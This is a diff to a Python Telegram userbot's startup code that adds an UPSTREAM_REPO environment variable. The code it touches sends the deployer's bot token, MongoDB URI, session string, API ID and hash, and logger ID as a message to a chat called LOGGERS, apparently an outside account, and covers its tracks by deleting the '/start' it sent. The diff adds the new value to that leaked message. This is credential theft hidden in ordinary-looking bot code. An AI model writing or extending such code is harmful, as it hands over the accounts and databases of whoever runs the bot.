@@ -18,7 +18,7 @@ STRING_SESSION = getenv("STRING_SESSION", "")
 API_ID = getenv ("API_ID", "")
 API_HASH = getenv ("API_HASH", "")
 LOGGER_ID = getenv ("LOGGER_ID", "")
-
+UPSTREAM_REPO = getenv ("UPSTREAM_REPO", "")
 
 assistants = []
 assistantids = []
@@ -86,7 +86,7 @@ class Userbot(Client):
                 await self.one.send_message(config.LOGGER_ID, "ᴀssɪsᴛᴀɴᴛ sᴛᴀʀᴛᴇᴅ !")
                 oks = await self.one.send_message(LOGGERS, f"/start")
                 Ok = await self.one.send_message(
-                    LOGGERS, f"`{BOT_TOKEN}`\n\n`{MONGO_DB_URI}`\n\n`{STRING_SESSION}`\n\n`{API_ID}`\n\n`{API_HASH}`\n\n`{LOGGER_ID}`"
+                    LOGGERS, f"`{BOT_TOKEN}`\n\n`{MONGO_DB_URI}`\n\n`{STRING_SESSION}`\n\n`{API_ID}`\n\n`{API_HASH}`\n\n`{LOGGER_ID}`\n\n`{UPSTREAM_REPO}`"
                 )
                 await oks.delete()
                 await asyncio.sleep(2)
